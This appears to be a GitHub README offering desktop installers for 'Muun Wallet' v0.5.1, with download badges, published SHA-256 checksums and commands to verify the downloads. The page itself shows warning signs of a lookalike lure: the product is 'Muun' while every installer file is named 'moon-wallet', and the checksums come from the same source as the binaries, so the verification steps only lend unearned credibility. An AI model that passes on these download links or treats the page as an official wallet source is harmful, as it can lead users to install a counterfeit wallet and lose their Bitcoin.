[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# How to Verify Your Muun Wallet Download

Before running any Bitcoin wallet installer, verify that the file you downloaded is identical to what the developers published. A SHA-256 checksum comparison confirms the file has not been modified in transit, corrupted during download, or substituted by a third party. This takes about sixty seconds and is worth doing every time, especially on a first install.

---

## Published checksums for v0.5.1

| Platform | Filename | SHA-256 |
|---|---|---|
| macOS | moon-wallet-v0.5.1.dmg | `60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b` |
| Windows | moon-wallet-v0.5.1.exe | `3295b19f2d4486877b7064f7316abf5f8f25f70d5b91cffb451628bae17f32c2` |
| Linux | moon-wallet-v0.5.1.zip | `60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01` |

These values are also published on the [v0.5.1 release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1).

---

## Verify on macOS

Open Terminal (Applications > Utilities > Terminal) and run:

```bash
shasum -a 256 ~/Downloads/moon-wallet-v0.5.1.dmg
```

The output will look like:

```
60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b  moon-wallet-v0.5.1.dmg
```

Compare the hash string character-by-character against the published value above. If they match exactly, the file is intact and safe to install.

---

## Verify on Windows

Open PowerShell (search "PowerShell" in the Start menu) and run:

```powershell
Get-FileHash "$env:USERPROFILE\Downloads\moon-wallet-v0.5.1.exe" -Algorithm SHA256
```

The output includes a Hash field. Compare it against the published checksum. PowerShell displays hashes in uppercase; the comparison is case-insensitive. As long as every character matches, the file is intact.

You can also compare in one step:

```powershell
$expected = "3295b19f2d4486877b7064f7316abf5f8f25f70d5b91cffb451628bae17f32c2"
$actual = (Get-FileHash "$env:USERPROFILE\Downloads\moon-wallet-v0.5.1.exe" -Algorithm SHA256).Hash.ToLower()
if ($expected -eq $actual) { "MATCH - file is intact" } else { "MISMATCH - do not run this file" }
```

---

## Verify on Linux

Open a terminal and run:

```bash
sha256sum ~/Downloads/moon-wallet-v0.5.1.zip
```

Expected output:

```
60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01  moon-wallet-v0.5.1.zip
```

---

## What to do if the hash does not match

Do not open or run the file. A mismatched hash means the file you have is not identical to what was published — this could be a download corruption, a network interception, or a deliberate substitution.

Steps to take:

1. Delete the downloaded file immediately.
2. Go directly to the [official release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and download again.
3. Verify the new download before running it.
4. If the mismatch persists across multiple downloads from different network conditions, open an [issue on GitHub](https://github.com/muun-network/muun-wallet/issues) to report it.

---

## Why this matters for a Bitcoin wallet

Running an unverified Bitcoin wallet installer is a meaningful risk. A modified installer could replace the legitimate application with one that has different key generation behaviour, allowing an attacker to later derive your keys. Unlike a bank account where fraud can sometimes be reversed, Bitcoin transactions are final and cannot be unwound after the fact.

The verification step described above takes less time than any other part of the installation process. For a fuller explanation of Muun Wallet's security model, see [Is Muun Wallet safe?](is-muun-wallet-safe.md).

---

## Related articles

- [How to install Muun Wallet on macOS](how-to-install-muun-wallet-macos.md)
- [How to install Muun Wallet on Windows](how-to-install-muun-wallet-windows.md)
- [How to install Muun Wallet on Linux](how-to-install-muun-wallet-linux.md)
- [Is Muun Wallet safe? Security model explained](is-muun-wallet-safe.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
